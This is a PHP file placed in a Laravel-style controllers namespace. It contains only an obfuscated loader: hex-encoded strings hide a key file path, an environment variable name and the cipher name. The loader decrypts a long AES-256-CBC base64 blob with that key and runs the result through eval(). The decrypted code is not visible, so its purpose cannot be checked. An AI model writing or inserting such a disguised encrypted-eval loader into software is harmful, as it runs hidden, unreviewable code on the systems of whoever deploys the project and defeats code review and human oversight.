<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Eyq6WGcp5SkeUgTtJy6WdA==');

$c=base64_decode(

's8Srd2JpU1gioAqH5B1+VSd9Z6r8KTw1MbrGlgajEOgHxxF4zINfamQEdzmQjpST/AcRQzpy+f11' .
'Q1RanuAe2e8Loxs3LTfhmqdbSA5x8T8beLPtLw32z4FFiPGINVa735sWb1ttKVXoCFmqvXIrb3M+' .
'gvAYHkwp8mQcALb13DRpl+Le7wM2n0Cr6CSnsj9XOyOkX0S6usykLae0bcj1wTJ3F1sINAVguzPh' .
'fK+abKtI6P3EzqCH51l6K9HZAWvm83AaLyeGSwD/j4Mc5PjsaoVnfOlDAntVeiazG+lfOJj8CJ55' .
'kOV1sGurvSwWnznjXQ9V+cfePCrn/kFV+Z7ZORFPKSvBAG+AecdCGv9+pjdoPrJG95CdhD6GiShT' .
'WmKEdcSVAiVRwiAKmu7DlVtAjGGG6cd6BO+zGtPIk0bLZwgkiEFq+f22Um6UEnr6Xnn3rLF3EgWY' .
'JnI2J6C3SVZZ5Rvi0cLEvb5asyYrdI06IOxvLOLZu7ge60NGamMalWyApndVWG5XRresESHbsDKl' .
'ysmN44wlcsYrvnYSo0mxf2HXyxrxXKByfvFgFA/S/z0QvTFui3TyIUhQ6dWOBHNQggaA/AWLh6Ga' .
'Sp1MAMs25nbK5dD8Wcg4TSlLkkysfE5ef9YEyWxLEIsO/ERSbIBsz7oShQVgvPKV//7JOET/uNHg' .
'Vi+c9WhjLc5ldSnW/HNY0DeJGjb5/xG3UG5g40rHnobY0G3djtioydggwcRHuefrkO+4iwgVMVOF' .
'UOeo3ix9vsCectfRPaCbEWvkJYSwfUzHK7ZyQ1ZLi/TJvxUF36gkGHznC8XYbMmmIVjqUI+tRm1x' .
'/dE66/arc9BWSAhWsANM/7L2DTqYGzGmQplFy3P+lqdJWkWnCf7n6dm3g+fB2xnjo8dZBN4zkOrY' .
's9h9Wg+AucFO2zUf3UdXMlNeWnmI/T+5xbkE7w8svhkVwo5v+u+w6aBAhTJkX7bp9yT1RQxMb8Kf' .
'UL1WflAqAOA73gGDmo4bYwrB83LN7nU6LqgoeFTVLH7jHBILXDbRLhNHYTnwiSQCpErzuLTtuP3p' .
'H2QIZoVGlu85lOFWEXayyROLJ5LXOZHGAXfhT+yK9L9XrUGUGFZFgrkqd4EZgMaITX8MNntOahDK' .
'ulBm6PRqwjdF0V9fdM9djZ5wfsP7wMyPC7Zt6dccLSC+V5FVBNnkAf/gMpGWVDT3aPVNh/76diYc' .
'MGAohtDYUinn4xWRUKAtJki/Qxq22yNR4bmv/xBjto/JgruAejq5kBVWKqyW0LS8nAlScJ2JmgZs' .
'/ScYXs1gnRlds8YnlHlEYjDu1Q2i45t1N1jBSErqs9Le5vHaoIoqOJoJGcusWs9ZtDGF3y3jdvG/' .
'bbFe2obMF6q4EDa2NH2aFHIiHjPIOT7po2r92jfFUKOIjzKVKvWGf69UnNZGy4TCYht06xXiB/f4' .
'1Zof/J8z49UsJFQqJj73lI+kKkj/w1yiMhCGJapPaMy4cafH1TcFxYQUgoAaVbnmgnzY0FGJT7Wt' .
'OtRsiw793n8QxdGZNmiZbXtNi7/LjRno2MIDhroCzAL9n1AtvPmTUDQs3bw7k35CPnrfVLK/rPRR' .
'7MNb+t6uk7sC5UXDKZxZuVEk7DgPl01s/fqoEslRYWzYfxaCPpGA/6loKqev966eqW7xN5R6DpP0' .
'5akyoh1qi9xEZild3X97NLBEB7QbAJd3aqs6VpvkwSQt5U4xBP4JTeB18vrqsfn01sQJFXW3uBdP' .
'ojce9bFdUZ8ZvmlVl5XBhfbCLTOAe/W8ysFGNmDvmZRRWsiO/epliUdI7QJlxwWYURbl5xkqMpqC' .
'c2xw7durhnQEl+9oPS5hUhEzJsiqGK3Dafq4Q8dLs6KP5pvbCysgIqeOkiOlRxtaCSAb0I4MqLrD' .
'7zX49YykUgRNAHFmXSdpVrzLqJoAASHauBSOz+KfV2hb9jwCp7c3CO3LeFiwUP3mOeq1Yu78EyLL' .
'HH0lzLICUdTVTMtg383gn7O5G+02++sP7JaRplME6NdhmRrtt77t0TYOyETXB9H5rQRvu2eLFA32' .
'JyC4mIrPmniwo68Jh1KivbYX2q6kjjR9HRx4g5j4U04kTu4K6/V9d+cuHZ42WdGrCwKWh4RQt9Xa' .
'Ak7vNbNk+FOD51BIi/3vscJhvmLSZ8r1MBaluVZz0/njRqjvFaui4A/7hu5IhLRqGjWYPZg4eyMd' .
'3Y95kjNNsuRIm2IXEEPFUZopRkfkGqtYAEBpCsfUVH/KBVOpG7ianamml5Rr8I+52aydNcscclaR' .
'hTcNz5DyU4wkrsqFciJSo2fGK654rQxW4P+DsUIpXfyMoeANASaLf5a+pun0MgZHiYvtGO5bliTX' .
'6T/4QOFIQHKKDF6CIrlFdvDOLraZucnTE/tWlshaPRP/zuK10pMuC+/l4ak57ep7jwsZs3xLBblP' .
'79An9rDcztenGbuujsgw1i7PiT7D9JpMdWACuzQHaRllj/9SDid1UwY9J0amNtowzdWFIDdNXaEA' .
'JZqJk+3DJtwQ1ncmy8qbbUMLNReC+Q6BPgH+cYyQAOXSlS7Rw5omzcxgelzX1fMJzgLBczuE/1qJ' .
'Y/Pg/ePSmsDFukUcZ56AX2NOxBebu2okEuzvz+B0jRfAue8gdiBpXlPiZ0KSdSrPpA2zMbVfVXUf' .
'Xo2WIx3KCLOpDKlFS37GmCT9sdvqg22fp3BVHz4iRgofe9hkii8RR3FQ5P/rXIVHdE9KjDhdj+v6' .
'r/8VvT1tKWTTUQ7a3HYXx4SHsnrS1PKzUuesgMBFG9a/5GOkofoF5TfxQVMfHhA1KBJ1uWBqHQRA' .
'PQBVT2VQqCJj/70nE9zaZbp2/P1ksZ7Cd6eYe73l6yW8CT5QeEANM95EIfQ1nk/betOjjpQymkuc' .
'bMC70hLWYVoYS5rwvvo1zfOq2cxtpU+J6t6ND11cj+PSyInMsFs4K+9C19RQvqCe8qiSbxY9LQl1' .
'edKa5/KFIGQL2hmUg7/5hsvs74Mf5596pMVGn0MWa6eGfgHRgmeGL7b8Qay9Bjr0lwCkCZflNoN2' .
'DuAo7Z/K/dBICfV5VeO5e1gvCeeT8feuOS0kSEJBr3LglLj7CGsRjNKEroKtboECo2pcLh2VBZ58' .
'n6bwEdn52tlvkgs8fuqnZhQ780Cg+l2hsBk70tDrlvaXSbMnrh0Z0BbDuBBlN5X4ZCyUIRrCYsdA' .
'RwUZq8N30SHmrRbPJHCBrP4GxAydydSs58wIoBd5nqaKp2R4ttyFVWlKeyW7Haw9BwNA1ydTANCc' .
'xwiOfjJmHf9+Bjp0w25XJN0eVV8OKf7Y5ts9sZ0B8savXVo1UkvslKSLBKD+8nhK0nd8R1RP0YUY' .
'29FtKYCiVL1WtCaoSC4bsVxWHv/wY8OZ1YJYMI++EFbF4Ihv80k7xHmTapFi2ZsUvOHL/dhet5r9' .
'U3oWY3aZAkGs/kw9pqK8UlsATNhDeviVUZ+x'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

